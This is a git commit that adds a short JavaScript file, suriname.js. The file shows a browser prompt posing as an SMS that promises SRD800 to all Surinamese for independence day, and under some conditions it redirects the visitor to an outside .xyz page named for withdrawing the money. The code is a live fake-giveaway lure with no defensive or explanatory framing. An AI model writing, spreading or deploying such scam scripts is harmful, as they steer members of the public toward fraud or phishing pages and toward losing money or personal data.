31cf8b12723bf2a263b51d5ecfec7aed31d040d1
newetijazz9 <newetijazz9@gmail.com>
2025-11-21 11:31:43 +0100

    Create suriname.js

---
+++ suriname.js
@@ -0,0 +1,5 @@
+var password = 'KRIJG SRD800'
+password=prompt('SMS: Hallo, wij geven SRD800 aan alle Surinamers om dit jaar de onafhankelijkheidsdag te vieren, druk op OK om te krijgen SRD800','KRIJG SRD800');
+if (password != 'KRIJG SRD800') {
+location.href='https://www.ekporoku.xyz/Terugtrekken-srd800';
+}
